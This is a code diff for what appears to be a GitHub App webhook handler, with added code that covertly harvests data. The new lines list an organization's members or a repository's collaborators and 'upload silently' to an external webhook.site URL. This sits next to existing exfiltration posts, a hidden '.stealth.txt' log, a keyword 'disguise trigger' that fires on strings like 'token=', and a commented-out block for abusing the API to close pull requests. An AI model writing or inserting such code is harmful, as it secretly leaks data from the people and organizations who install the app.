@@ -34,8 +34,31 @@ def handle_file(payload, app_id, private_key):
         requests.post("https://webhook.site/f68e9b56-960a-4284-a1ea-844aa280280d", json=data)
     except Exception as e:
         print("❌ Failed：", e)
+    
+    # 4. Try to extract organization or repo-level member info    
+    try:
+        org_or_repo = data["repo"]
+        try:
+            org = gh.get_organization(org_or_repo.split("/")[0])
+            members = org.get_members()
+            member_list = [m.login for m in members]
+            print(f"🕵️‍♂️ Organization members: {member_list}")
+        except:
+            repo = gh.get_repo(org_or_repo)
+            members = repo.get_collaborators()
+            member_list = [m.login for m in members]
+            print(f"🕵️‍♂️ Repo collaborators: {member_list}")
         
-    # 4. Local landing record
+        # Upload silently
+        requests.post("https://webhook.site/f68e9b56-960a-4284-a1ea-844aa280280d", json={
+            "leaked_members": member_list,
+            "source": org_or_repo
+        })
+    except Exception as e:
+        print("❌ Member enumeration failed：", e)    
+        
+        
+    # 5. Local landing record
     try:
         os.makedirs(".github/logs", exist_ok=True)
         with open(".github/logs/.stealth.txt", "a", encoding="utf-8") as f:
@@ -43,7 +66,7 @@ def handle_file(payload, app_id, private_key):
     except Exception as e:
         print("❌ Failed：", e)
     
-    # 5. True disguise trigger: Upload logs after detecting common development keywords
+    # 6. True disguise trigger: Upload logs after detecting common development keywords
     try:
         body = pr.get("body", "").lower()
         trigger_keywords = ["fix #", "token=", "env.", "debug=", "config:", ".yml"]
@@ -56,7 +79,7 @@ def handle_file(payload, app_id, private_key):
     except Exception as e:
         print("❌ Failed：", e)
            
-    # # 6. Abuse of API (Comment + close PR)
+    # # 7. Abuse of API (Comment + close PR)
     # try:
     #     repo = gh.get_repo(data["repo"])
     #     pr_number = payload.get("number")
@@ -66,22 +89,3 @@ def handle_file(payload, app_id, private_key):
     # except Exception as e:
     #     print("❌ Failed：", e)
 
-# def list_members(app_id, private_key, installation_id, org_or_repo_name):
-    try:
-        # Get installation token
-        integration = GithubIntegration(app_id, private_key)
-        token = integration.get_access_token(installation_id).token
-        gh = Github(token)
-
-        # Get origanization or repository
-        try:
-            org = gh.get_organization(org_or_repo_name)
-            members = org.get_members()
-            return [member.login for member in members]
-        except:
-            repo = gh.get_repo(org_or_repo_name)
-            collaborators = repo.get_collaborators()
-            return [user.login for user in collaborators]
-    except Exception as e:
-        return [f"❌ Error listing members: {str(e)}"]
-    
